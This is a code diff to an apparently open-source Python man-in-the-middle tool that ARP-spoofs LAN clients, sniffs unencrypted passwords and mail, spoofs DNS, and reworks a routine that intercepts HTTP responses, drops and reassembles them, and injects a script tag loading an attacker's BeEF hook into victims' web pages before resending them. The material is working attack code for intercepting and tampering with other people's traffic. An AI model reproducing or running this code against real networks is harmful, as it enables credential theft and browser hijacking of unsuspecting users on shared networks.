@@ -1,10 +1,6 @@
 #!/usr/bin/python
-
 '''
 Description:	MITMs another LAN client and prints all the interesting unencrypted info like passwords and messages. Asynchronous multithreaded arp spoofing packet parser.
-Author:			Dan McInerney
-Contact:		danhmcinerney gmail
-
 Prerequisites:	Linux
 					nmap (optional)
 					nbtscan (optional)
@@ -16,6 +12,13 @@ Prerequisites:	Linux
 
 Note: 			This script flushes iptables before and after usage.
 '''
+__author__ = 'Dan McInerney'
+__license__ = 'GPL'
+__email__ = 'danhmcinerney with gmail'
+__version__ = 1.0
+
+####################################################################
+
 
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
@@ -103,7 +106,7 @@ class Parser():
 	catch_pkts = 0
 	full_pkt = ''
 	full_load = ''
-	drop_load = []
+	drop_body = []
 	start_time = 0
 
 	def start(self, payload):
@@ -123,14 +126,6 @@ class Parser():
 					sport = pkt[TCP].sport
 					ack = pkt[TCP].ack
 					load = pkt[Raw].load
-#################################################
-					if sport == 80:
-#						for x in self.drop_load:
-#							if load == x:
-#								payload.set_verdict(nfqueue.NF_DROP)
-#								return
-						self.beef(load, ack, pkt, payload)
-#################################################
 					mail_ports = [25, 26, 110, 143]
 					if dport in mail_ports or sport in mail_ports:
 						self.mailspy(load, dport, sport, IP_dst, IP_src, mail_ports, ack)
@@ -140,6 +135,8 @@ class Parser():
 						self.ftp(load, IP_dst, IP_src)
 					if dport == 80 or sport == 80:
 						self.URL(load, ack, dport, sport)
+						if sport == 80 and args.beef:
+							self.beef(load, ack, pkt, payload)
 		if args.dnsspoof:
 			if pkt.haslayer(DNSQR):
 				dport = pkt[UDP].dport
@@ -149,36 +146,38 @@ class Parser():
 					dns_layer = pkt[DNS]
 					self.dnsspoof(dns_layer, IP_src, IP_dst, sport, dport, localIP, payload)
 
-#################################################
 	def beef(self, load, ack, pkt, payload):
-		current_time = time.time()
-############### Maybe test the next packet for having headers. If it does, then block it and inject?
-		if self.catch_pkts == 1 and current_time > self.start_time + 1:
-			for x in self.drop_load:
-				if load == x:
-					print '[-] load found in drop_load list'
-					payload.set_verdict(nfqueue.NF_DROP)
-					break
-			self.inject()
+		heads = 0
+		try:
+			headers, body = load.split("\r\n\r\n", 1)
+			heads = 1
+		except:
+			pass
+		if self.catch_pkts == 1:
+			if heads == 1 or ack != self.oldBEEFack:
+				heads = 0
+				self.catch_pkts = 0
+				self.inject()
 		if self.catch_pkts == 1 and self.oldBEEFack == ack and self.oldBEEFack != 0:
 			self.full_data = self.full_data+load
-			print '[+] Added data to the BeEF queue'
+			print '[+] Added data to the BeEF packet'
 			payload.set_verdict(nfqueue.NF_DROP)
 			return
 		if 'Content-Type: text/html' in load and self.catch_pkts == 0:
-			self.start_time = time.time()
 			print '[+] HTML packet found, starting BeEF queue'
-			self.drop_load.append(load)
 			self.oldBEEFack = ack
 			self.full_pkt = pkt
 			self.full_data = load
 			self.server = pkt[IP].src
 			self.catch_pkts = 1
 			payload.set_verdict(nfqueue.NF_DROP)
-			return
 
 	def inject(self):
-		url = '<script src='+args.beef+'></script> '
+
+		html = '<script src='+args.beef+'></script> '
+
+		body_found = 0
+
 		if self.full_pkt != '' and self.full_data != '':
 
 			try:
@@ -197,26 +196,29 @@ class Parser():
 						print '[-] Could not decompress body of packet'
 						self.full_data = ''
 						self.full_pkt = ''
-						self.catch_pkts = 0
 						self.oldBEEFack = 0
 						return
 
-			if '<html' in body:
-				psplit = str(body).split('<head>')
+			if '<html' in body or '/html>' in body:
 				try:
-					body = psplit[0]+'<head> '+url+psplit[1]
+					psplit = str(body).split('</head>')
+					body = psplit[0]+html+'</head>'+psplit[1]
 				except:
-					print '[-] <head> not found in load'
+					print '[-] </head> not found in load'
 					try:
-						psplit = str(body).split('</head>')
-						body = psplit[0]+url+'</head>'+psplit[1]
+						psplit = str(body).split('<head>')
+						body = psplit[0]+'<head>'+html+psplit[1]
 					except:
-						print '[-] </head> not found in load'
+						print '[-] Failed to inject html'
 						self.full_data = ''
 						self.full_pkt = ''
-						self.catch_pkts = 0
 						self.oldBEEFack = 0
 						return
+
+			# For debugging
+#			fp = open(str(self.oldBEEFack)+'.html', 'wb')
+#			fp.write(headers+"\r\n\r\n"+body)
+#			fp.close
 
 			# Recompress data if necessary
 			if 'Content-Encoding: gzip' in headers:
@@ -229,7 +231,6 @@ class Parser():
 				except:
 					self.full_data = ''
 					self.full_pkt = ''
-					self.catch_pkts = 0
 					self.oldBEEFack = 0
 					print '[-] Could not recompress html'
 
@@ -239,7 +240,6 @@ class Parser():
 				print '[-] Could not split headers at Content-Length\n'
 				self.full_data = ''
 				self.full_pkt = ''
-				self.catch_pkts = 0
 				self.oldBEEFack = 0
 				return
 			httpnewlength = str(len(headers+"\r\n\r\n"+body))
@@ -250,14 +250,11 @@ class Parser():
 			del self.full_pkt[IP].chksum
 			del self.full_pkt[TCP].chksum
 
-			catch_pkts = 0
 			send(self.full_pkt)
 			print '[!] Sent injected packet'
 			self.full_data = ''
 			self.full_pkt = ''
-			self.catch_pkts = 0
 			self.oldBEEFack = 0
-#################################################
 
 	# Spoof DNS for a specific domain to point to your machine
 	def dnsspoof(self, dns_layer, IP_src, IP_dst, sport, dport, localIP, payload):
